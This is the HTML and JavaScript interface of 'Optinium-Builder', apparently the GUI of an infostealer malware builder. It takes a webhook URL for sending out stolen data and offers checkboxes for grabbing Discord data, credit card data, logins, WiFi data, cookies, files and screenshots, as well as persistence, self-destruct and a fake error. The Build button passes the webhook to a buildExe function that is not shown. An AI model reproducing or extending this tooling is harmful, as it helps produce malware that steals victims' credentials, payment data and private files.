<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Advanced Builder GUI</title>
        <style>
            body {
                overflow: hidden;
                background: #1a202c;
                color: #edf2f7;
                padding: 10px;
                font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
            }
            h1 {
                font-size: 1.8rem;
                font-weight: 6000;
            }

            label {
                color: rgb(172, 172, 172);
            }
            
            input[type="text"] {
                border: none;
                width: calc(100% - 15px);
                padding: 0.5rem;
                background: #2d3748;
                border-radius: 0.375rem;
                color: #edf2f7;
                transition: 0.1s ease, 0.2s ease;
            }
            input[type="text"]:focus,
            input[type="text"]:hover {
                transform: scale(1.01);
                outline: none;
                box-shadow: 0 0 10px white;
            }
            .checkbox-grid {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 1rem;
                margin-top: 1rem;
            }
            .checkbox-label {
                display: flex;
                justify-content: space-between;
                padding: 0.75rem;
                background: #2d3748;
                border-radius: 0.5rem;
                cursor: pointer;
                transition: 0.3s ease, 0.2s ease;
            }
            .checkbox-label:hover {
                background: #4a5568;
                transform: scale(1.03);
                box-shadow: 0 0 10px white;
            }
            .checkbox-label span {
                color: #edf2f7;
            }
            button {
                width: 100%;
                margin-top: 1.5rem;
                padding: 0.75rem;
                background: hsl(212, 52%, 46%);
                border-radius: 0.5rem;
                color: white;
                font-size: 1rem;
                font-weight: 600;
                border: none;
                transition: 0.2s ease, 0.3s ease;
            }
            button:hover {
                cursor: pointer;
                transform: scale(1.015);
                outline: 1px solid white;
                background: #315d97;
            }
        </style>
    </head>
    <body>
        <h1>Optinium-Builder</h1>
        <label>Webhook URL:</label>
        <input type="text" placeholder="Enter webhook URL" id="webhook-input"/>
        <div class="checkbox-grid">
            <label class="checkbox-label"><span>System Data</span><input type="checkbox" id="SystemData" /></label>
            <label class="checkbox-label"><span>IP Data</span><input type="checkbox" id="IpData" /></label>
            <label class="checkbox-label"><span>Discord Data</span><input type="checkbox" id="DiscordData" /></label>
            <label class="checkbox-label"><span>Credit Card Data</span><input type="checkbox" id="CardData" /></label>
            <label class="checkbox-label"><span>Login Data</span><input type="checkbox" id="LoginData" /></label>
            <label class="checkbox-label"><span>WiFi Data</span><input type="checkbox" id="WifiData" /></label>
            <label class="checkbox-label"><span>Visited URLs</span><input type="checkbox" id="VisitedURLs" /></label>
            <label class="checkbox-label"><span>Screenshot</span><input type="checkbox" id="Screenshot" /></label>
            <label class="checkbox-label"><span>Self Destruct</span><input type="checkbox" id="SelfDestruct" /></label>
            <label class="checkbox-label"><span>Persist</span><input type="checkbox" id="Persist" /></label>
            <label class="checkbox-label"><span>Fake Error</span><input type="checkbox" id="FakeError" /></label>
            <label class="checkbox-label"><span>Steal Files</span><input type="checkbox" id="StealFiles" /></label>
            <label class="checkbox-label"><span>Steal Cookies</span><input type="checkbox" id="CookieData" /></label>
            <label class="checkbox-label"><span>Sleep</span><input type="checkbox" id="Sleep" /></label>
        </div>
        <button onclick="build()">Build</button>
    </body>
    <script>
        document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
            checkbox.addEventListener('change', updateState);
        })

        function updateState(event) {
            const checkbox = event.target;
            toggleState(checkbox.id);            
        }

        function build() {
            const webhook = document.getElementById("webhook-input");
            buildExe(webhook.value)
        }
    </script>
</html>
